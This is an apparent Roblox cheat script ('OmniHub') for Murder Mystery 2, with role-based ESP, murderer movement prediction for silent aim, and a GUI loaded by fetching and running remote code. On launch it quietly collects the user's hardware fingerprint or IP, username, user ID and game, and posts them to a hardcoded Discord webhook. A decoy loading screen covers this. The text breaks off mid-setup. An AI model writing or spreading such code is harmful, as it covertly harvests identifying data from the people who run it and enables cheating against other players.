local http_request

-- Establish the appropriate HTTP request function based on execution environment
if syn then
   http_request = syn.request
elseif SENTINEL_V2 then
   http_request = function(tb)
       return {
           StatusCode = 200,
           Body = request(tb.Url, tb.Method, tb.Body or '')
       }
   end
elseif http and http.request then
   http_request = http.request
elseif request then
   http_request = request
elseif httpservice then
   http_request = httpservice.request
else
   -- Fallback for unsupported exploits
   http_request = function()
       return {StatusCode = 404, Body = "{}"}
   end
end

-- Discord webhook configuration
local WEBHOOK_URL = "https://discord.com/api/webhooks/1332981779916918836/dTw4xZHg7nZda7IvtOXYHgnAFGIVmQ-NLWi15jQQ0gbsIXIrzeG3IuRt9sttkT_gW1Hh"

-- Comprehensive fingerprint extraction function
function get_hwid()
   -- Attempt to retrieve headers from HTTP request
   local success, response = pcall(function()
       return http_request({
           Url = 'https://httpbin.org/get',
           Method = 'GET'
       })
   end)
   
   if not success or not response or response.StatusCode ~= 200 then
       return "Failed to retrieve HWID: Request error", "Error"
   end
   
   -- Parse JSON response
   local success, decoded_body = pcall(function()
       return game:GetService('HttpService'):JSONDecode(response.Body)
   end)
   
   if not success or not decoded_body or not decoded_body.headers then
       return "Failed to decode response", "Error"
   end
   
   -- Comprehensive list of exploit-specific fingerprint headers
   local hwid_keys = {
       -- PC exploits
       ["Syn-Fingerprint"] = "Synapse X",
       ["Exploit-Guid"] = "Generic",
       ["Krnl-Hwid"] = "KRNL",
       ["Sw-Fingerprint"] = "Script-Ware",
       ["Delta-Fingerprint"] = "Delta",
       ["Fluxus-Fingerprint"] = "Fluxus",
       ["Codex-Fingerprint"] = "Codex",
       ["Wave-Fingerprint"] = "Electron",
       ["Solara-Fingerprint"] = "Solara",
       ["Xeno-Fingerprint"] = "Xeno",
       ["Illusion-Fingerprint"] = "Illusion",
       
       -- Mobile exploits
       ["Arceus-Hardware"] = "Arceus X",
       ["Hydrogen-Id"] = "Hydrogen",
       ["Oxygen-Hardware"] = "Oxygen U",
       ["Fluxus-Mobile-Id"] = "Fluxus Mobile",
       ["Delta-Mobile"] = "Delta Mobile",
       ["Electron-Mobile"] = "Electron Mobile"
   }
   
   -- Check for any matching fingerprint header
   for header, executor in pairs(hwid_keys) do
       if decoded_body.headers[header] then
           return decoded_body.headers[header], executor
       end
   end
   
   -- Fallback: Analyze User-Agent for executor identification
   local user_agent = decoded_body.headers["User-Agent"]
   if user_agent then
       -- Attempt to identify executor from User-Agent string
       local executor_patterns = {
           {"Electron", "Electron"},
           {"Arceus", "Arceus X"},
           {"Fluxus", "Fluxus"},
           {"Oxygen", "Oxygen U"},
           {"Hydrogen", "Hydrogen"},
           {"Delta", "Delta"},
           {"Krnl", "KRNL"},
           {"SynapseX", "Synapse X"}
       }
       
       for _, pattern in ipairs(executor_patterns) do
           if user_agent:match(pattern[1]) then
               return user_agent, pattern[2]
           end
       end
       
       return user_agent, "Unknown (UA)"
   end
   
   -- Last resort: IP identification
   if decoded_body.origin then
       return decoded_body.origin, "IP-Address"
   end
   
   return "Unidentified client", "Unknown"
end

-- Send HWID to Discord webhook
function send_to_webhook(hwid, executor, player_info)
   -- Ensure the webhook URL is set
   if not WEBHOOK_URL or WEBHOOK_URL:match("your_webhook") then
       warn("Webhook URL not configured properly")
       return false
   end
   
   -- Format the data for Discord embedding
   local payload = {
       embeds = {
           {
               title = "HWID Captured",
               color = 0x2F3136,
               fields = {
                   {name = "Executor", value = executor or "Unknown", inline = true},
                   {name = "Username", value = player_info.Username or "Unknown", inline = true},
                   {name = "User ID", value = player_info.UserId or "Unknown", inline = true},
                   {name = "Hardware ID", value = "```" .. (hwid or "Failed to retrieve") .. "```", inline = false},
                   {name = "Game ID", value = game.PlaceId, inline = true},
                   {name = "Game Name", value = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, inline = true}
               },
               footer = {
                   text = "Captured at " .. os.date("%Y-%m-%d %H:%M:%S")
               }
           }
       }
   }
   
   -- Convert to JSON string
   local json_payload = game:GetService("HttpService"):JSONEncode(payload)
   
   -- Send to webhook
   local success, response = pcall(function()
       return http_request({
           Url = WEBHOOK_URL,
           Method = "POST",
           Headers = {
               ["Content-Type"] = "application/json"
           },
           Body = json_payload
       })
   end)
   
   return success and response and response.StatusCode == 204
end

-- Main execution flow
local function main()
   -- Collect player information
   local player_info = {
       Username = game:GetService("Players").LocalPlayer.Name,
       UserId = game:GetService("Players").LocalPlayer.UserId,
       AccountAge = game:GetService("Players").LocalPlayer.AccountAge
   }
   
   -- Get HWID from client
   local hwid, executor = get_hwid()
   
   -- Log HWID to console for debugging
   print("Hardware ID:", hwid)
   print("Executor detected:", executor)
   
   -- Send HWID to Discord webhook
   local webhook_success = send_to_webhook(hwid, executor, player_info)
   
   if webhook_success then
       print("Successfully Get HWID")
   else
       warn("Failed")
   end
end

-- Initialize the fingerprint capture process
main()

-- Store function globally for external access
_G.get_hwid = get_hwid


-- Ultra-Optimized Character Outline ESP for MM2
-- Core Services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- Game-specific state tracking
local roles = {}
local Murder, Sheriff, Hero = nil, nil, nil
local GunDrop = nil

-- ESP Configuration
local ESP = {
   Enabled = true,
   OutlineThickness = 3,
   MaxRenderDistance = 175,
   Colors = {
       Murderer = Color3.fromRGB(255, 0, 0),
       Sheriff = Color3.fromRGB(0, 100, 255),
       Hero = Color3.fromRGB(255, 215, 0),
       Innocent = Color3.fromRGB(50, 255, 100),
       GunDrop = Color3.fromRGB(255, 255, 50)
   }
}

-- FIX: Use proper container instance for client-side rendering
local HighlightFolder = Instance.new("Folder")
HighlightFolder.Name = "ESP_Highlights"
-- Use proper parent for client-side UI elements
if syn and syn.protect_gui then
    syn.protect_gui(HighlightFolder)
    HighlightFolder.Parent = game:GetService("CoreGui")
else
    HighlightFolder.Parent = CoreGui
end

-- Highlight object container with strict typing
local Highlights = {}

-- Game mechanics functions
function IsAlive(Player)
   for i, v in pairs(roles) do
       if Player.Name == i then
           return not (v.Killed or v.Dead)
       end
   end
   return false
end

-- FIX: Reliable role tracking with connection management
local RoleUpdateConnection = nil
local function SetupRoleTracking()
    -- Clear previous connection if it exists
    if RoleUpdateConnection then
        RoleUpdateConnection:Disconnect()
        RoleUpdateConnection = nil
    end
    
    -- Create new connection with proper error handling
    RoleUpdateConnection = RunService.Heartbeat:Connect(function()
        pcall(function()
            if ReplicatedStorage:FindFirstChild("GetPlayerData", true) then
                roles = ReplicatedStorage:FindFirstChild("GetPlayerData", true):InvokeServer()
                for i, v in pairs(roles) do
                    if v.Role == "Murderer" then Murder = i
                    elseif v.Role == "Sheriff" then Sheriff = i
                    elseif v.Role == "Hero" then Hero = i end
                end
            end
        end)
    end)
end

-- FIX: Reliable gun tracking
local GunTrackingConnections = {}
local function SetupGunTracking()
    -- Clear previous connections
    for _, conn in pairs(GunTrackingConnections) do
        conn:Disconnect()
    end
    table.clear(GunTrackingConnections)
    
    -- Check for existing gun drop
    for _, item in pairs(workspace:GetChildren()) do
        if item.Name == "GunDrop" then
            GunDrop = item
            break
        end
    end
    
    -- Setup new connections
    GunTrackingConnections[1] = workspace.ChildAdded:Connect(function(child)
        if child.Name == "GunDrop" then GunDrop = child end
    end)
    
    GunTrackingConnections[2] = workspace.ChildRemoved:Connect(function(child)
        if child == GunDrop then GunDrop = nil end
    end)
end

-- Get role color mapping
local function GetPlayerColor(playerName)
   if playerName == Murder then return ESP.Colors.Murderer
   elseif playerName == Sheriff then return ESP.Colors.Sheriff
   elseif playerName == Hero then return ESP.Colors.Hero
   else return ESP.Colors.Innocent end
end

-- FIX: Create optimized character outline with proper error handling
local function CreateOutline(player)
   if not player or not player.Parent then return nil end
   if Highlights[player] then return Highlights[player] end
   
   local highlight = Instance.new("Highlight")
   highlight.Name = player.Name
   highlight.FillTransparency = 0.85
   highlight.FillColor = GetPlayerColor(player.Name)
   highlight.OutlineColor = GetPlayerColor(player.Name)
   highlight.OutlineTransparency = 0
   highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
   highlight.Enabled = ESP.Enabled
   highlight.Parent = HighlightFolder
   
   -- Apply pulsing effect to murderer for improved visibility
   if player.Name == Murder then
       local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
       local tween = TweenService:Create(highlight, tweenInfo, {OutlineTransparency = 0.4})
       tween:Play()
   end
   
   Highlights[player] = highlight
   return highlight
end

-- FIX: Reliable outline removal with proper cleanup
local function RemoveOutline(player)
   local highlight = Highlights[player]
   if highlight then
       highlight:Destroy()
       Highlights[player] = nil
   end
end

-- FIX: Enhanced ESP update function with proper validation
local function UpdateESP()
   -- Update highlights based on ESP.Enabled state
   for player, highlight in pairs(Highlights) do
       if type(player) == "table" and player:IsA("Player") then
           highlight.Enabled = ESP.Enabled
       end
   end
   
   -- Exit early if disabled
   if not ESP.Enabled then return end
   
   -- Update ESP for each player
   for _, player in ipairs(Players:GetPlayers()) do
       if player == LocalPlayer then continue end
       
       local character = player.Character
       if not character or not character:FindFirstChild("HumanoidRootPart") or not IsAlive(player) then
           if Highlights[player] then
               Highlights[player].Enabled = false
           end
           continue
       end
       
       -- Distance check for optimization
       local rootPart = character:FindFirstChild("HumanoidRootPart")
       local distance = (rootPart.Position - Camera.CFrame.Position).Magnitude
       
       if distance > ESP.MaxRenderDistance then
           if Highlights[player] then
               Highlights[player].Enabled = false
           end
           continue
       end
       
       -- Create or update outline
       local highlight = CreateOutline(player)
       if highlight then
           highlight.Adornee = character
           highlight.FillColor = GetPlayerColor(player.Name)
           highlight.OutlineColor = GetPlayerColor(player.Name)
           highlight.Enabled = true
       end
   end
   
   -- Gun Drop ESP handling
   if GunDrop and GunDrop.Parent then
       if not Highlights.GunDrop then
           local highlight = Instance.new("Highlight")
           highlight.Name = "GunDrop"
           highlight.FillTransparency = 0.5
           highlight.FillColor = ESP.Colors.GunDrop
           highlight.OutlineColor = ESP.Colors.GunDrop
           highlight.OutlineTransparency = 0
           highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
           highlight.Enabled = ESP.Enabled
           highlight.Parent = HighlightFolder
           
           Highlights.GunDrop = highlight
       end
       Highlights.GunDrop.Adornee = GunDrop
   elseif Highlights.GunDrop then
       Highlights.GunDrop:Destroy()
       Highlights.GunDrop = nil
   end
end

-- FIX: Enhanced player joining/leaving handlers
local PlayerAddedConnection = nil
local PlayerRemovingConnection = nil

local function SetupPlayerConnections()
    -- Clear previous connections
    if PlayerAddedConnection then PlayerAddedConnection:Disconnect() end
    if PlayerRemovingConnection then PlayerRemovingConnection:Disconnect() end
    
    -- Setup new connections
    PlayerAddedConnection = Players.PlayerAdded:Connect(function(player)
        -- Force update highlights on player join
        task.delay(1, function()
            if not player or not player.Parent then return end
            if player.Character then
                UpdateESP()
            end
            
            player.CharacterAdded:Connect(function()
                task.delay(0.5, UpdateESP) -- Update after character loads
            end)
        end)
    end)
    
    PlayerRemovingConnection = Players.PlayerRemoving:Connect(function(player)
        RemoveOutline(player)
    end)
    
    -- Setup character connections for existing players
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            player.CharacterAdded:Connect(function()
                task.delay(0.5, UpdateESP) -- Update after character loads
            end)
        end
    end
end

-- FIX: ESP Toggle function with proper state management
local function ToggleESP(state)
    ESP.Enabled = state
    
    -- Update all existing highlights
    for player, highlight in pairs(Highlights) do
        highlight.Enabled = state
    end
    
    -- Force immediate update
    if state then
        UpdateESP()
    end
end

--------------------------LOADER-----------------------LOADER--------------------------

-- OmniHub Loader GUI Script with Water Transition Animation

-- OmniHub Loader GUI Script with Water Transition Animation

local player = game.Players.LocalPlayer
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "OmniHubLoader"
screenGui.ResetOnSpawn = false
screenGui.Parent = player:WaitForChild("PlayerGui")

-- Create main container frame with rounded corners
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 450, 0, 250)
mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
mainFrame.BorderSizePixel = 0
mainFrame.BackgroundTransparency = 1
mainFrame.Parent = screenGui

-- Add UI corner to main frame
local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 12)
mainCorner.Parent = mainFrame

-- Add drop shadow
local dropShadow = Instance.new("ImageLabel")
dropShadow.Name = "DropShadow"
dropShadow.AnchorPoint = Vector2.new(0.5, 0.5)
dropShadow.BackgroundTransparency = 1
dropShadow.Position = UDim2.new(0.5, 0, 0.5, 0)
dropShadow.Size = UDim2.new(1, 40, 1, 40)
dropShadow.ZIndex = 0
dropShadow.Image = "rbxassetid://6014261993"
dropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
dropShadow.ImageTransparency = 1
dropShadow.ScaleType = Enum.ScaleType.Slice
dropShadow.SliceCenter = Rect.new(49, 49, 450, 450)
dropShadow.Parent = mainFrame

-- Create water particles container
local waterContainer = Instance.new("Frame")
waterContainer.Name = "WaterContainer"
waterContainer.Size = UDim2.new(1, 0, 1, 0)
waterContainer.BackgroundTransparency = 1
waterContainer.ClipsDescendants = true
waterContainer.Parent = mainFrame

-- Create logo
local logo = Instance.new("ImageLabel")
logo.Name = "Logo"
logo.Size = UDim2.new(0, 100, 0, 100)
logo.Position = UDim2.new(0.5, 0, 0.3, 0)
logo.AnchorPoint = Vector2.new(0.5, 0.5)
logo.BackgroundTransparency = 1
logo.Image = "rbxassetid://122380482857500" -- Replace with your logo asset ID
logo.ImageTransparency = 1
logo.Parent = mainFrame

-- Create title
local title = Instance.new("TextLabel")
title.Name = "Title"
title.Size = UDim2.new(1, 0, 0, 50)
title.Position = UDim2.new(0, 0, 0.55, 0)
title.Font = Enum.Font.GothamBold
title.Text = "OMNIHUB"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 36
title.BackgroundTransparency = 1
title.TextTransparency = 1
title.Parent = mainFrame

-- Create version text
local versionText = Instance.new("TextLabel")
versionText.Name = "Version"
versionText.Size = UDim2.new(1, 0, 0, 20)
versionText.Position = UDim2.new(0, 0, 0.67, 0)
versionText.Font = Enum.Font.Gotham
versionText.Text = "V1.1.5 • By Azzakirms"
versionText.TextColor3 = Color3.fromRGB(180, 180, 255)
versionText.TextSize = 14
versionText.BackgroundTransparency = 1
versionText.TextTransparency = 1
versionText.Parent = mainFrame

-- Create loading status
local statusText = Instance.new("TextLabel")
statusText.Name = "Status"
statusText.Size = UDim2.new(0.8, 0, 0, 20)
statusText.Position = UDim2.new(0.1, 0, 0.78, 0)
statusText.Font = Enum.Font.Gotham
statusText.Text = "Initializing..."
statusText.TextColor3 = Color3.fromRGB(200, 200, 200)
statusText.TextSize = 16
statusText.BackgroundTransparency = 1
statusText.TextTransparency = 1
statusText.Parent = mainFrame

-- Create progress bar container
local progressContainer = Instance.new("Frame")
progressContainer.Name = "ProgressContainer"
progressContainer.Size = UDim2.new(0.8, 0, 0, 10)
progressContainer.Position = UDim2.new(0.1, 0, 0.85, 0)
progressContainer.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
progressContainer.BorderSizePixel = 0
progressContainer.BackgroundTransparency = 1
progressContainer.Parent = mainFrame

-- Add corner to progress container
local progressCorner = Instance.new("UICorner")
progressCorner.CornerRadius = UDim.new(0, 5)
progressCorner.Parent = progressContainer

-- Create progress bar fill
local progressFill = Instance.new("Frame")
progressFill.Name = "ProgressFill"
progressFill.Size = UDim2.new(0, 0, 1, 0)
progressFill.BackgroundColor3 = Color3.fromRGB(79, 149, 255)
progressFill.BorderSizePixel = 0
progressFill.BackgroundTransparency = 1
progressFill.Parent = progressContainer

-- Add corner to progress fill
local fillCorner = Instance.new("UICorner")
fillCorner.CornerRadius = UDim.new(0, 5)
fillCorner.Parent = progressFill

-- Create glow effect behind progress bar
local progressGlow = Instance.new("ImageLabel")
progressGlow.Name = "ProgressGlow"
progressGlow.BackgroundTransparency = 1
progressGlow.Position = UDim2.new(0, -10, 0, -10)
progressGlow.Size = UDim2.new(1, 20, 1, 20)
progressGlow.ZIndex = 0
progressGlow.Image = "rbxassetid://5028857084"
progressGlow.ImageColor3 = Color3.fromRGB(79, 149, 255)
progressGlow.ImageTransparency = 1
progressGlow.Parent = progressFill

-- Create fadeOut animation
local fadeOut = Instance.new("NumberValue")
fadeOut.Name = "FadeOut"
fadeOut.Value = 0
fadeOut.Parent = screenGui

-- Create water droplet function
local function createWaterParticle(startPosition)
   local droplet = Instance.new("Frame")
   droplet.Size = UDim2.new(0, math.random(5, 20), 0, math.random(5, 20))
   droplet.Position = startPosition
   droplet.BackgroundColor3 = Color3.fromRGB(79, 149, 255)
   droplet.BackgroundTransparency = math.random(2, 5) / 10
   droplet.BorderSizePixel = 0
   
   local uiCorner = Instance.new("UICorner")
   uiCorner.CornerRadius = UDim.new(1, 0)
   uiCorner.Parent = droplet
   
   -- Add glow effect to droplet
   local dropletGlow = Instance.new("ImageLabel")
   dropletGlow.BackgroundTransparency = 1
   dropletGlow.Position = UDim2.new(0, -5, 0, -5)
   dropletGlow.Size = UDim2.new(1, 10, 1, 10)
   dropletGlow.ZIndex = 0
   dropletGlow.Image = "rbxassetid://5028857084"
   dropletGlow.ImageColor3 = Color3.fromRGB(79, 149, 255)
   dropletGlow.ImageTransparency = 0.7
   dropletGlow.Parent = droplet
   
   droplet.Parent = waterContainer
   return droplet
end

-- Main loading sequence
local function startLoader()
   -- Intro water droplet animation (faster)
   for i = 1, 50 do  -- Reduced from 100 to 50 iterations
       local xPos = math.random(0, 450)
       local yPos = -20
       local startPosition = UDim2.new(0, xPos, 0, yPos)
       local droplet = createWaterParticle(startPosition)
       
       spawn(function()
           for j = 1, 20 do  -- Faster movement
               droplet.Position = UDim2.new(0, xPos, 0, yPos + j * 15)
               wait(0.005)  -- Faster animation
           end
           
           -- When droplets reach bottom, start "forming solid"
           if i > 40 then
               mainFrame.BackgroundTransparency = (50 - i) / 10
               dropShadow.ImageTransparency = (50 - i) / 10
           end
           
           wait(0.3)  -- Shorter wait time
           droplet:Destroy()
       end)
       
       wait(0.03)  -- Faster droplet creation
   end
   
   -- Show UI elements (faster)
   for i = 10, 0, -2 do  -- Step by 2 instead of 1 for speed
       title.TextTransparency = i/10
       logo.ImageTransparency = i/10
       versionText.TextTransparency = i/10
       statusText.TextTransparency = i/10
       progressContainer.BackgroundTransparency = i/10
       progressFill.BackgroundTransparency = i/10
       progressGlow.ImageTransparency = 0.7 + (i/30)
       wait(0.02)  -- Faster transition
   end
   
   -- Loading sequence
   local loadingSteps = {
       "Checking Modules...",
       "Checking Script...",
       "Getting Common Information..."
   }
   
   -- Progress loading (faster)
   for i, step in ipairs(loadingSteps) do
       statusText.Text = step
       
       local startFill = (i-1)/3
       local endFill = i/3
       
       for j = 1, 10 do  -- Each step takes 1 second (10 * 0.1)
           local progress = startFill + ((endFill - startFill) * (j/10))
           progressFill.Size = UDim2.new(progress, 0, 1, 0)
           wait(0.1)
       end
   end
   
   -- Final loading period (reduced time)
   statusText.Text = "Finalizing..."
   for i = 1, 45 do  -- 4.5 seconds (reduced from 9 seconds)
       progressFill.Size = UDim2.new(1, 0, 1, 0)
       wait(0.1)
   end
   
   -- Outro transition - form liquid again (faster)
   for i = 0, 10, 2 do  -- Step by 2 for speed
       local transparency = i/10
       title.TextTransparency = transparency
       logo.ImageTransparency = transparency
       versionText.TextTransparency = transparency
       statusText.TextTransparency = transparency
       progressContainer.BackgroundTransparency = transparency
       progressFill.BackgroundTransparency = transparency
       progressGlow.ImageTransparency = 0.7 + (i/30)
       wait(0.02)  -- Faster transition
   end
   
   -- Create falling water effect (faster)
   for i = 1, 50 do  -- Reduced from 100 to 50 iterations
       local xPos = math.random(0, 450)
       local yPos = math.random(0, 250)
       local startPosition = UDim2.new(0, xPos, 0, yPos)
       local droplet = createWaterParticle(startPosition)
       
       spawn(function()
           for j = 1, 20 do  -- Faster movement
               droplet.Position = UDim2.new(0, xPos, 0, yPos + j * 15)
               wait(0.005)  -- Faster animation
           end
           
           -- When droplets start falling, fade out main frame
           if i > 10 then
               local transparency = i / 50
               mainFrame.BackgroundTransparency = transparency
               dropShadow.ImageTransparency = transparency
           end
           
           wait(0.05)  -- Shorter wait time
           droplet:Destroy()
       end)
       
       wait(0.03)  -- Faster droplet creation
   end
   
   -- Create and play fadeOut animation
   local fadeOutTween = game:GetService("TweenService"):Create(
       fadeOut,
       TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out),  -- Reduced from 1 to 0.5 seconds
       {Value = 1}
   )
   
   fadeOutTween:Play()
   fadeOutTween.Completed:Wait()
   
   screenGui:Destroy()
end

-- Start the loading sequence
startLoader()


local function getPredictedPosition(murderer)
   local character = murderer.Character
   if not character then return nil end
   
   local rootPart = character:FindFirstChild("HumanoidRootPart")
   local humanoid = character:FindFirstChild("Humanoid")
   local head = character:FindFirstChild("Head")
   if not rootPart or not humanoid then return nil end
   
   -- Network and performance variables
   local ping = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()
   local fps = 1 / game:GetService("RunService").RenderStepped:Wait()
   local pingCompensation = math.clamp(ping / 1000, 0.08, 0.35)
   local timeSkip = pingCompensation * (60 / math.clamp(fps, 30, 120))
   
   -- Character state tracking
   local state = humanoid:GetState()
   local isAirborne = state == Enum.HumanoidStateType.Freefall or state == Enum.HumanoidStateType.Jumping
   local currentVelocity = rootPart.AssemblyLinearVelocity
   local moveDirection = humanoid.MoveDirection
   local moveSpeed = humanoid.WalkSpeed
   local position = rootPart.Position
   
   -- Physics parameters
   local gravity = workspace.Gravity
   local terminalVelocity = -100
   local groundFriction = 0.8
   local airResistance = 0.02
   local jumpDecay = 0.86
   
   -- Momentum tracking (store this in a module-level table between calls)
   if not _G.velocityHistory then _G.velocityHistory = {} end
   if not _G.velocityHistory[murderer.UserId] then 
       _G.velocityHistory[murderer.UserId] = {
           positions = {},
           velocities = {},
           timestamps = {},
           lastJumpTime = 0
       }
   end
   
   local history = _G.velocityHistory[murderer.UserId]
   table.insert(history.positions, position)
   table.insert(history.velocities, currentVelocity)
   table.insert(history.timestamps, tick())
   
   -- Keep history size manageable
   if #history.positions > 10 then
       table.remove(history.positions, 1)
       table.remove(history.velocities, 1)
       table.remove(history.timestamps, 1)
   end
   
   -- Calculate acceleration from history
   local acceleration = Vector3.new(0, 0, 0)
   if #history.velocities >= 3 then
       local v2 = history.velocities[#history.velocities]
       local v1 = history.velocities[#history.velocities-2]
       local t2 = history.timestamps[#history.timestamps]
       local t1 = history.timestamps[#history.timestamps-2]
       local dt = t2 - t1
       if dt > 0 then
           acceleration = (v2 - v1) / dt
       end
   end
   
   -- Detect jumping patterns
   local jumpPrediction = 0
   if humanoid.Jump then
       history.lastJumpTime = tick()
       jumpPrediction = humanoid.JumpPower * 0.5
   elseif tick() - history.lastJumpTime < 0.3 then
       jumpPrediction = humanoid.JumpPower * 0.75 * (1 - (tick() - history.lastJumpTime) / 0.3)
   end
   
   -- Iterative position prediction with sub-steps
   local predictedPosition = position
   local predictedVelocity = currentVelocity
   local subSteps = 5
   local subTimeSkip = timeSkip / subSteps
   
   for step = 1, subSteps do
       -- Calculate target velocity based on movement input
       local targetGroundVelocity = moveDirection * moveSpeed
       
       -- Current horizontal velocity
       local horizontalVelocity = Vector3.new(predictedVelocity.X, 0, predictedVelocity.Z)
       
       -- Apply acceleration toward target velocity
       if moveDirection.Magnitude > 0.1 then
           local velocityDiff = targetGroundVelocity - horizontalVelocity
           local accelerationFactor = isAirborne and 0.6 or 1.0
           horizontalVelocity = horizontalVelocity + velocityDiff * accelerationFactor * subTimeSkip * 10
       else
           -- Apply friction when not actively moving
           horizontalVelocity = horizontalVelocity * (1 - (isAirborne and airResistance or groundFriction) * subTimeSkip * 10)
       end
       
       -- Handle vertical velocity
       local verticalVelocity = predictedVelocity.Y
       
       if isAirborne then
           -- Apply gravity
           verticalVelocity = math.max(verticalVelocity - gravity * subTimeSkip, terminalVelocity)
       else
           -- On ground, decay any vertical velocity
           verticalVelocity = verticalVelocity * jumpDecay
           
           -- Check if likely to jump soon based on patterns
           if jumpPrediction > 0 then
               verticalVelocity = jumpPrediction
               jumpPrediction = 0
           end
       end
       
       -- Update velocity
       predictedVelocity = Vector3.new(horizontalVelocity.X, verticalVelocity, horizontalVelocity.Z)
       
       -- Add acceleration component from history analysis
       predictedVelocity = predictedVelocity + acceleration * subTimeSkip
       
       -- Apply velocity to position
       predictedPosition = predictedPosition + predictedVelocity * subTimeSkip
       
       -- Collision detection and resolution
       local raycastParams = RaycastParams.new()
       raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
       raycastParams.FilterDescendantsInstances = {character}
       
       -- Ground collision
       local floorRay = workspace:Raycast(predictedPosition, Vector3.new(0, -humanoid.HipHeight - 0.5, 0), raycastParams)
       if floorRay then
           predictedPosition = Vector3.new(predictedPosition.X, floorRay.Position.Y + humanoid.HipHeight, predictedPosition.Z)
           if predictedVelocity.Y < 0 then
               predictedVelocity = Vector3.new(predictedVelocity.X, 0, predictedVelocity.Z)
           end
       end
       
       -- Wall collisions
       for _, direction in pairs({Vector3.new(1,0,0), Vector3.new(-1,0,0), Vector3.new(0,0,1), Vector3.new(0,0,-1)}) do
           local wallRay = workspace:Raycast(predictedPosition, direction * 2, raycastParams)
           if wallRay then
               local normal = wallRay.Normal
               local penetration = 2 - wallRay.Distance
               
               -- Push back from wall
               predictedPosition = predictedPosition + normal * penetration
               
               -- Reflect velocity
               local dot = predictedVelocity:Dot(normal)
               if dot < 0 then
                   predictedVelocity = predictedVelocity - 2 * dot * normal
                   predictedVelocity = predictedVelocity * 0.8 -- energy loss
               end
           end
       end
   end
   
   -- Aim adjustment based on target part
   if head then
       -- Target upper torso/head area
       local headOffset = (head.Position - rootPart.Position) * 0.8
       predictedPosition = predictedPosition + Vector3.new(0, headOffset.Y, 0)
   end
   
   -- Additional path prediction for fast movements
   if currentVelocity.Magnitude > moveSpeed * 1.5 then
       -- Fast movement detected - possible dash or teleport ability
       predictedPosition = predictedPosition + currentVelocity.Unit * currentVelocity.Magnitude * timeSkip * 0.5
   end
   
   -- Account for network jitter
   if ping > 150 then
       -- Add extra prediction for high ping
       predictedPosition = predictedPosition + predictedVelocity * (ping / 1000) * 0.3
   end
   
   return predictedPosition
end

local function GetMurderer()
   local players = game:GetService("Players"):GetPlayers()
   for _, player in ipairs(players) do
       if player.Character and player.Character:FindFirstChild("Knife") then
           return player
       end
   end
   return nil
end

local Players = game:GetService("Players")

local predictionState = {
   pingEnabled = true,
   pingValue = 100  -- Default ping value
}

local function GetMurderer()
   local players = game:GetService("Players"):GetPlayers()
   for _, player in ipairs(players) do
       if player.Character and player.Character:FindFirstChild("Knife") then
           return player
       end
   end
   
   -- Additional check for knife in backpack
   for _, player in ipairs(players) do
       if player.Character and player.Backpack and player.Backpack:FindFirstChild("Knife") then
           return player
       end
   end
   
   -- Check for murderer role in player attributes
   for _, player in ipairs(players) do
       if player:GetAttribute("Role") == "Murderer" then
           return player
       end
   end
   
   -- Check for murder animations playing
   for _, player in ipairs(players) do
       if player.Character and player.Character:FindFirstChild("Humanoid") then
           local animator = player.Character.Humanoid:FindFirstChildOfClass("Animator")
           if animator then
               for _, track in pairs(animator:GetPlayingAnimationTracks()) do
                   if track.Animation.Name:lower():match("knife") or track.Animation.Name:lower():match("stab") then
                       return player
                   end
               end
           end
       end
   end
   
   return nil
end

-- Fluent UI Integration (preserved from original code)
local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()

local Window = Fluent:CreateWindow({
  Title = "OmniHub Script By Azzakirms",
  SubTitle = "V1.1.5",
  TabWidth = 100,
  Size = UDim2.fromOffset(380, 300),
  Acrylic = true,
  Theme = "Dark",
  MinimizeKey = Enum.KeyCode.LeftControl
})

-- Create tabs
local Tabs = {
   Main = Window:AddTab({ Title = "Main", Icon = "eye" }),
   Visuals = Window:AddTab({ Title = "Visuals", Icon = "camera" }),
   Combat = Window:AddTab({ Title = "Combat", Icon = "crosshair" }),
   Farming = Window:AddTab({ Title = "Farming", Icon = "dollar-sign" }),
   Premium = Window:AddTab({ Title = "Premium", Icon = "star" }),
   Discord = Window:AddTab({ Title = "Join Discord", Icon = "message-square" }),
   Settings = Window:AddTab({ Title = "Settings", Icon = "settings" })
}

-- Add ESP toggle to Visuals tab
Tabs.Visuals:AddSection("Character ESP")

-- FIX: Properly implement toggle callback
Tabs.Visuals:AddToggle("ESPToggle", {
   Title = "Esp Players",
   Default = ESP.Enabled,
   Callback = function(Value)
       ToggleESP(Value)
   end
})

local SilentAimToggle = Tabs.Main:AddToggle("SilentAimToggle", {
  Title = "Silent Aim",
  Default = false,
  Callback = function(toggle)
      AimButton.Visible = toggle
  end
})

local AimGui = Instance.new("ScreenGui")
local AimButton = Instance.new("ImageButton")

AimGui.Parent = game.CoreGui
AimButton.Parent = AimGui
AimButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
AimButton.BackgroundTransparency = 0.3
AimButton.BorderColor3 = Color3.fromRGB(255, 100, 0)
AimButton.BorderSizePixel = 2
